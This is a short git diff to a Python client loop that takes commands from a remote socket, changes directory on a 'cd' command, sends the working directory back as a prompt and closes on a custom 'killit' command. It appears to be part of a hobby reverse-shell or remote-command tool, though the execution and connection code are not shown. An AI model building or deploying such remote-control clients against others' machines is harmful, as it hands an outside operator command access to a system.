@@ -21,15 +21,17 @@ while True:
             os.chdir(os.path.dirname(sys.argv[0]))
         except OSError:
             s.send("Client is already in starting directory!" + str(os.getcwd()) + "> ")
-    elif data[:2].decode("utf-8") == "cd":
+    elif data[:3].decode("utf-8") == "cd ":
         try:
             # This line is causing issues, need to look into it and fix it within this branch
             os.chdir(data[3:].decode("utf-8"))
         except OSError:
             s.send("Directory does not exist: " + str.encode(str(OSError) + str(os.getcwd()) + "> "))
-    #Personalised client side kill command, can't use 'kill' because that's already used by linux based OS
+    # Personalised client side kill command, can't use 'kill' because that's already used by linux based OS
     elif data[:].decode("utf-8") == 'killit':
+        s.send("Closing Connection...")
         s.close()
+        break
     # Check is command is not 'cd' and more than 0 bytes,
     # This shouldn't fail because the server already has a check set up for this
     if len(data) > 0:
